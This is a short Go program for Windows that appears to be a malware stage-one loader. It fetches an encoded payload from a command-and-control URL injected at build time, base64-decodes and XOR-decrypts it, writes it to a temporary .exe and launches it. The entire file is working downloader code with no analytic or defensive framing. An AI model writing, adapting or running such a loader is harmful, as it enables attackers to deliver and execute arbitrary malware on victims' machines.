//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var (
	C2URL  string // injected via ldflags
	XORKey string // hex-encoded XOR key, injected via ldflags
)

func main() {
	resp, err := http.Get(C2URL + "/stage/" + XORKey)
	if err != nil {
		os.Stderr.WriteString("error fetching stage: " + err.Error() + "\n")
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Stderr.WriteString("error reading response body: " + err.Error() + "\n")
		return
	}

	data, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		os.Stderr.WriteString("error decoding base64: " + err.Error() + "\n")
		return
	}

	key, err := hex.DecodeString(XORKey)
	if err != nil {
		os.Stderr.WriteString("error decoding XOR key: " + err.Error() + "\n")
		return
	}

	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Stderr.WriteString("error creating temp file: " + err.Error() + "\n")
		return
	}
	defer tmpFile.Close()

	if _, err := tmpFile.Write(data); err != nil {
		os.Stderr.WriteString("error writing payload to temp file: " + err.Error() + "\n")
		return
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()

	exec.Command(tmpPath).Start()
}
